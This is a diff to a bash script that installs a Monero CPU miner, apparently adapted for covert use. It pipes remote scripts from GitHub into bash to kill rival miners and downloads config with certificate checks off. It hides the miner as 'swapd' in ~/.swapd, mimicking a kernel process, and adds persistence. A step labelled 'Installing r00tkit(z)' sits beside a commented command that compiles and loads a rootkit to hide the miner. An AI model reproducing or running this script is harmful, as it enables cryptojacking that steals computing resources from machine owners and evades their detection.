@@ -22,8 +22,8 @@ VERSION=2.11
 
 # printing greetings
 
-echo "MoneroOcean mining setup script v$VERSION."
-echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
+echo "[*] MoneroOcean mining setup script v$VERSION."
+echo "[*] "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
 
 if [ "$(id -u)" == "0" ]; then
   echo "WARNING: Generally it is not adviced to run this script under root"
@@ -33,12 +33,12 @@ fi
 WALLET=$1
 EMAIL=$2 # this one is optional
 
-#BotKiller
+echo "[*] #executing #BotKiller..."
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
 curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
 # curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash
 
-# checking prerequisites
+echo "[*] #checking prerequisites..."
 
 if [ -z $WALLET ]; then
   echo "Script usage:"
@@ -80,7 +80,7 @@ fi
 #  fi
 #fi
 
-# calculating port
+echo "[*] #calculating port..."
 
 CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
@@ -140,7 +140,7 @@ if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
 fi
 
 
-# printing intentions
+echo "[*] #printing intentions..."
 
 echo "I will download, setup and run in background Monero CPU miner."
 echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
@@ -165,7 +165,7 @@ sleep 1
 echo
 echo
 
-# start doing stuff: preparing miner
+echo "[*] #start doing stuff: preparing miner..."
 
 echo "[*] Removing previous moneroocean miner (if any)"
 if sudo -n true 2>/dev/null; then
@@ -175,7 +175,7 @@ fi
 killall -9 xmrig
 killall -9 kswapd0
 
-echo "[*] Removing $HOME/moneroocean directory"
+echo "[*] Removing previous directories..."
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
 rm -rf $HOME/.gdm2
@@ -198,7 +198,7 @@ fi
 rm xmrig.tar.gz
 
 echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.swapd/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
 $HOME/.swapd/xmrig --help >/dev/null
 if (test $? -ne 0); then
   if [ -f $HOME/.swapd/xmrig ]; then
@@ -240,7 +240,8 @@ echo "[*] Miner $HOME/.swapd/xmrig is OK"
 
 mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS=`hostname`
 if [ "$PASS" == "localhost" ]; then
   PASS=`ip route get 1 | awk '{print $NF;exit}'`
 fi
@@ -280,14 +281,14 @@ mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json
 #}
 #EOL
 
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json ; mv config.json $HOME/.swapd/config.json
 curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
 
 
 cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
 
-# preparing script
+#echo "[*] #preparing script..."
 
 killall xmrig
 
@@ -304,7 +305,7 @@ EOL
 
 chmod +x $HOME/.swapd/swapd.sh
 
-# preparing script background work and work under reboot
+#echo "[*] #preparing script background work and work under reboot..."
 
 if ! sudo -n true 2>/dev/null; then
   if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
@@ -357,7 +358,7 @@ EOL
   fi
 fi
 
-#echo "[*] Installing r00tkit"
+echo "[*] #Installing r00tkit(z)"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
 echo ""
